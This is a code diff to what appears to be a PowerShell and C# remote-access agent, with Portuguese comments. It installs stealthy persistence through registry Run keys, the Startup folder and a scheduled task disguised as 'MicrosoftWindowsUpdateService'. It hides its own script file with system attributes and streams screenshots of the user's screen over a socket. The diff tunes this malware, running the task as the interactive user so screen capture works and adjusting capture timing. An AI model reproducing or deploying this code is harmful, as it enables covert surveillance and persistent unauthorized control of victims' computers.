@@ -22,23 +22,25 @@ if ($args -notcontains "-silent") {
     
     $cmd = "wscript.exe //B //Nologo `"$vbsPath`""
     
+    # 1. Registro (Roda no login do usuário)
     try {
         Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
     } catch {}
 
+    # 2. Pasta Startup
     try {
         $startup = [Environment]::GetFolderPath('Startup')
         Copy-Item $vbsPath "$startup\$installName.vbs" -Force -ErrorAction SilentlyContinue
     } catch {}
 
+    # 3. Agendador de Tarefas (Rodando como USUÁRIO, não SYSTEM, para ter acesso à tela)
     try {
         $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "//B //Nologo `"$vbsPath`""
-        $trigger1 = New-ScheduledTaskTrigger -AtStartup
-        $trigger2 = New-ScheduledTaskTrigger -AtLogOn
-        $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+        $trigger1 = New-ScheduledTaskTrigger -AtLogOn
+        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
         $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Hours 0)
-        Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Action $action -Trigger $trigger1,$trigger2 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
+        Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Action $action -Trigger $trigger1 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
     } catch {}
     
     attrib +h +s +r $scriptPath 2>$null
@@ -186,14 +188,13 @@ if (-not ("R9KAgent" -as [type])) {
                         string b64 = CaptureScreen(1280, 40);
                         if (b64 != null) {
                             lock (writeLock) { myWriter.WriteLine("SCREEN:" + b64); }
+                            Thread.Sleep(30); 
                         } else {
-                            // Se a captura falhar, tenta de novo no próximo ciclo
-                            Thread.Sleep(100); 
+                            // Se a tela ainda não estiver pronta, espera um pouco mais
+                            Thread.Sleep(100);
                         }
-                        Thread.Sleep(30); 
                     } else { Thread.Sleep(50); }
                 } catch { 
-                    // Falha no socket ou captura, tenta novamente sem matar a thread
                     Thread.Sleep(1000); 
                 }
             }
@@ -366,7 +367,9 @@ if (-not ("R9KAgent" -as [type])) {
             try {
                 Rectangle bounds = Screen.PrimaryScreen.Bounds;
                 using (Bitmap bmp = new Bitmap(bounds.Width, bounds.Height)) {
-                    using (Graphics g = Graphics.FromImage(bmp)) { g.CopyFromScreen(0, 0, 0, 0, bmp.Size); }
+                    using (Graphics g = Graphics.FromImage(bmp)) { 
+                        g.CopyFromScreen(0, 0, 0, 0, bmp.Size); 
+                    }
                     Bitmap finalBmp = bmp;
                     if (maxW > 0 && bmp.Width > maxW) {
                         int newW = maxW, newH = (int)(bmp.Height * ((float)maxW / bmp.Width));
